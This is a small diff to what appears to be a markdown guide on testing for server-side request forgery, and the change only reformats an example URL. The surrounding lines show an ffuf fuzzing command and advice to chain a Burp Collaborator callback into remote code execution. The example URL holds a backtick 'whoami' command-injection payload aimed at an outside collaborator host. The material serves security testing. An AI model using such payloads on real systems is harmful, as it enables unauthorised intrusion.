@@ -38,5 +38,6 @@ ffuf -c -w ssrf-fuzz.txt -u FUZZ -t 200
 #Now we will check whetherwe get any http request hit on our burp collaborator server.
 ```
 **If you get any http ping back on burpcolaborator then try to chain with RCE**
-*http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami`*
+
+**http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami`**
 
